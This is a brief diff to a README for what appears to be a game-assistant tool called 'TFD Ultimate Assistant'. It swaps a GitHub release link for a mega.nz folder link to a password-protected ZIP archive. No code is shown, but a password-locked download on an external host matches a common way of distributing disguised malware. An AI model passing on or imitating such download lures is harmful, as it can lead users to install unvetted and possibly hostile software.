@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/kyler-dev2099g4/TFD-Ultimate-Assistant/releases/download/TFD/TFD_Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/gMN3nLBC#P1ldhYoUlHExIsR7VfJ1bQ)
 
 🔐 **Archive password:** **`5868781`**
 
